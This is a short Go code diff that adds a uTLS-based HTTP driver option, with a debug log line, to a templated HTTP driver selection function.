@@ -35,6 +35,12 @@ var (
 func GetHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, error) {
 	switch opts.Driver {
 
+	case utlsDriver:
+		// {{if .Config.Debug}}
+		log.Printf("Using utls http driver")
+		// {{end}}
+		return UTLSHTTPDriver(origin, secure, opts)
+
 	case goHTTPDriver:
 		// {{if .Config.Debug}}
 		log.Printf("Using go http driver")
